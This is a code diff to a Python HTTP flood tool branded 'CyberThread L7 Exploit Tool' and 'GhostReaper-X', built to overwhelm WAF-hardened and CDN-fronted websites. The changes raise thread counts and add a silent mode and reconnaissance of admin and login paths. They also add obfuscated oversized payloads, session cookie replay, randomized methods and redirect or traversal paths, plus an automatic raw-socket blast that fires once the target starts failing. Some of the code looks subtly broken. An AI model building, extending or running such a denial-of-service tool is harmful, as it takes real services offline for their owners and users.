@@ -46,11 +46,16 @@ success_rate = 0
 fail_ratio = 0
 max_retries = 5
 retry_counter = 0
+proxies = [f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}" for _ in range(10)]
+
+thread_local = threading.local()
 
 def parse_args():
     parser = argparse.ArgumentParser(description="CyberThread L7 Exploit Tool")
     parser.add_argument("--target", type=str, required=True, help="Target URL (e.g., http://example.com)")
     parser.add_argument("--fire", action="store_true", help="Run in brutal mode")
+    parser.add_argument("--threads", type=int, default=100, help="Number of threads")
+    parser.add_argument("--silent", action="store_true", help="Silent mode (no output)")
     return parser.parse_args()
 
 def load_list(file):
@@ -97,14 +102,29 @@ def generate_user_agent():
     ]
     return random.choice(user_agent_pool)
 
+def recon_target(url):
+    try:
+        parsed = urlparse(url)
+        common_paths = ["/admin", "/login", "/gateway", "/api/status", "/v1/ping"]
+        conn = http.client.HTTPSConnection(parsed.hostname, timeout=5)
+        for path in common_paths:
+            conn.request("GET", path)
+            res = conn.getresponse()
+            if res.status in [200, 403]:
+                print(f"[RECON ✓] {path} => {res.status}")
+    except Exception:
+        pass
+
 def mutate_payload(payload_type):
     if payload_type == "ghost-mutation":
-        return json.dumps({
-            "action": "ghost",
-            "random": random.randint(1, 9999),
-            "chain": ["A"*random.randint(100, 500) for _ in range(10)],
-            "overflow": "X" * random.randint(10000, 30000)
+        inner = json.dumps({
+            "overflow": "A" * random.randint(5000, 20000),
+            "nested": {"id": random.randint(1,9999), "sub": "X"*500}
         })
+        encoded = base64.b64encode(inner.encode()).decode()
+        return json.dumps({"enc": encoded})
+    elif payload_type == "mixed":
+        return f"data={base64.b64encode(os.urandom(50)).decode()}&chain=A{random.randint(1000,5000)}"
     elif payload_type == "form":
         return "key=value&random=" + str(random.randint(1, 9999))
     elif payload_type == "multipart":
@@ -134,8 +154,10 @@ def cycle_session():
             print(f"Login failed with status code {response.status}")
             return
 
+        cookies = response.getheader("Set-Cookie")
         action_payload = mutate_payload(payload_type)
         action_headers = inject_headers()
+        action_headers["Cookie"] = cookies
         conn.request(flood_method.upper(), target, action_payload, action_headers)
         response = conn.getresponse()
         handle_response(response, target, 1, time.time() - start_time)
@@ -153,7 +175,7 @@ def handle_response(response, target, proxy_hop, rtt):
     response_body = response.read().decode('utf-8', errors='ignore')
     status_counter[str(status_code)] = status_counter.get(str(status_code), 0) + 1
     if not silent_mode:
-        user_agent = headers.get('User-Agent', 'Unknown')
+        user_agent = response.getheader("User-Agent") or "Unknown"
         if 200 <= status_code < 300:
             print(f"{ANSI_GREEN}[200] OK - RTT: {rtt * 1000:.2f}ms - UA: {user_agent} - Payload: {payload_type}{ANSI_RESET}")
         elif status_code == 403:
@@ -168,26 +190,31 @@ def handle_response(response, target, proxy_hop, rtt):
 
     analyze_bypass(status_code, response_body)
 
+    if status_counter["503"] > 50:
+        print(f"{ANSI_YELLOW}[!] Overload threshold hit — launching raw_socket_blast(){ANSI_RESET}")
+        raw_socket_blast(parsed_url.hostname)
+
 def rotate_headers_and_tls():
     global headers, tls_context
     headers = inject_headers()
     tls_context = rotate_tls_context()
 
 def rotate_tls_context():
-    ctx = ssl.create_default_context()
-    ciphers = [
-        "ECDHE-RSA-AES128-GCM-SHA256",
-        "ECDHE-RSA-AES256-GCM-SHA384",
-        "ECDHE-ECDSA-AES256-GCM-SHA384",
-        "TLS_AES_256_GCM_SHA384"
-    ]
-    for cipher in ciphers:
-        try:
-            ctx.set_ciphers(cipher)
-            return ctx
-        except ssl.SSLError as e:
-            print(f"{ANSI_RED}[ERROR] TLS context rotation failed: {e}{ANSI_RESET}")
-    return ctx
+    if not hasattr(thread_local, "tls_ctx"):
+        thread_local.tls_ctx = ssl.create_default_context()
+        ciphers = [
+            "ECDHE-RSA-AES128-GCM-SHA256",
+            "ECDHE-RSA-AES256-GCM-SHA384",
+            "ECDHE-ECDSA-AES256-GCM-SHA384",
+            "TLS_AES_256_GCM_SHA384"
+        ]
+        for cipher in ciphers:
+            try:
+                thread_local.tls_ctx.set_ciphers(cipher)
+                return thread_local.tls_ctx
+            except ssl.SSLError as e:
+                print(f"{ANSI_RED}[ERROR] TLS context rotation failed: {e}{ANSI_RESET}")
+    return thread_local.tls_ctx
 
 def analyze_bypass(status_code, response_text):
     try:
@@ -239,7 +266,7 @@ def clone_target_headers():
     conn = http.client.HTTPSConnection(parsed_url.hostname)
     conn.request("GET", "/")
     res = conn.getresponse()
-    return dict(res.getheaders())
+    return {f"X-Clone-{k}": v for k, v in dict(res.getheaders()).items() if len(k) < 20}
 
 def raw_socket_blast(ip, port=443):
     context = rotate_tls_context()
@@ -248,9 +275,24 @@ def raw_socket_blast(ip, port=443):
             for _ in range(3):
                 payload = f"POST / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nContent-Length: 10000\r\n\r\n{'A'*10000}"
                 ssock.send(payload.encode())
+                time.sleep(0.3)
+
+def adaptive_header_clone():
+    try:
+        conn = http.client.HTTPSConnection(parsed_url.hostname)
+        conn.request("GET", "/")
+        res = conn.getresponse()
+        origin_headers = dict(res.getheaders())
+        clone = {
+            f"X-Clone-{k}": v[:50] for k, v in origin_headers.items() if isinstance(v, str) and len(v) < 80
+        }
+        return clone
+    except:
+        return {}
 
 def launch_ghost_sequence():
-    global target, threads, payload_type, ua_file, bypass_header, tls_spoofing, session_cycle, exploit_chain, delay, flood_method, failover_monitoring, silent_mode, log_file
+    global target, threads, payload_type, ua_file, bypass_header, tls_spoofing, session_cycle, exploit_chain, delay, flood_method, failover_monitoring, silent_mode, log_file, parsed_url
+    parsed_url = urlparse(target)
 
     print("\nReady to launch GhostReaper-X Sequence")
     print(f"Target     : {target}")
@@ -272,17 +314,25 @@ def launch_ghost_sequence():
     recon_target(target)
 
     def worker():
-        local_headers = inject_headers()
+        local_retry = 0
+        local_headers = get_thread_headers()
         tls_ctx = rotate_tls_context()
         while not stop_event.is_set():
             try:
                 semaphore.acquire()
                 conn = http.client.HTTPSConnection(parsed_url.hostname, context=tls_ctx)
                 local_headers['User-Agent'] = generate_user_agent()
-                target_path = parsed_url.path + f"?inject={random.randint(1, 1000)}"
-                local_headers[f"X-Chain-{random.randint(1, 5)}"] = "Exploit" + str(random.randint(1000, 9999))
+                chain_path = parsed_url.path + random.choice([
+                    "?redirect=/admin",
+                    "?next=/panel",
+                    "?url=https://evil.test",
+                    "/../admin",
+                    "/v1/login",
+                    "/v1/ghost"
+                ])
                 payload_data = mutate_payload(payload_type)
-                conn.request(flood_method.upper(), target_path, payload_data, local_headers)
+                method = random.choice(["POST", "PUT", "PATCH", "POST", "HEAD"])
+                conn.request(method, chain_path, payload_data, local_headers)
                 start_time = time.time()
                 response = conn.getresponse()
                 rtt = time.time() - start_time
@@ -290,8 +340,8 @@ def launch_ghost_sequence():
                 if session_cycle:
                     cycle_session()
                 if failover_monitoring and response.status in [403, 429, 503]:
-                    retry_counter += 1
-                    if retry_counter >= max_retries:
+                    local_retry += 1
+                    if local_retry >= max_retries:
                         stop_event.set()
                         break
                     time.sleep(delay + random.uniform(0.2, 1.0))
@@ -304,6 +354,11 @@ def launch_ghost_sequence():
             finally:
                 semaphore.release()
                 time.sleep(delay + random.uniform(0.1, 0.5))
+
+    def get_thread_headers():
+        if not hasattr(thread_local, "headers"):
+            thread_local.headers = inject_headers()
+        return thread_local.headers
 
     thread_pool = []
     for i in range(threads):
@@ -339,7 +394,7 @@ def print_banner_brutal():
 ║   ☠ CYBERTHREAD ☠                   ║
 ║   Layer-7 Adaptive Exploit Engine   ║
 ║   Status : LIVE | Threads : █████   ║
-║   Target : WAF-Hardened / CDN-Edge 
+║   Target : WAF-Hardened / CDN-Edge  ║
 ║   Target : WAF-Hardened / CDN-Edge  ║
 ╚══════════════════════════════════════╝
      ↳ Payload Mutation : ENABLED
@@ -360,6 +415,9 @@ if __name__ == "__main__":
 
     print_banner_brutal()
 
+    if args.silent:
+        silent_mode = True
+
     if args.fire:
         bypass_header = True
         tls_spoofing = True
@@ -368,7 +426,7 @@ if __name__ == "__main__":
         failover_monitoring = True
         delay = 0.1
         payload_type = "ghost-mutation"
-        threads = 250
+        threads = args.threads
         flood_method = "POST"
         ua_file = "/tmp/ua_fallback.txt"
 
